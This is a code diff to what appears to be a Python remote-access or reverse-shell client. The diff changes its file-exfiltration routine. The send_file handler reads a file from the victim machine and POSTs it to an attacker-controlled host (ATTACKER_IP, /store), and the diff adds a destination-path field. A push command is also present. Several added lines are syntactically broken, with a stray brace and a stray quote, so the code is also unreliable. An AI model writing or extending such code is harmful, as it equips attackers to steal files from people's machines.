@@ -8,8 +8,8 @@ ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
 ATTACKER_PORT = 8080
 
 # Data is a dict
-def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}'):
-    data = {"rfile": data}
+def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}',dst_path=f''):
+    data = {"rfile": data,"path": dst_path}}
     data = parse.urlencode(data).encode()
     req = request.Request(url, data=data)
     request.urlopen(req) # send request
@@ -17,7 +17,7 @@ def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}'):
 
 def send_file(command):
     try:
-        grab, path = command.strip().split(' ')
+        pull, path, dst_path = command.strip().split(' ') ')
     except ValueError:
         send_post("[-] Invalid grab command (maybe multiple spaces)")
         return
@@ -28,7 +28,8 @@ def send_file(command):
 
     store_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
     with open(path, 'rb') as fp:
-        send_post(fp.read(), url=store_url)
+        send_post(fp.read(), url=store_url, dst_path=dst_path)
+
 def save_file(command):
  if 'push' in command:
   push, path = command.strip().split(' ')
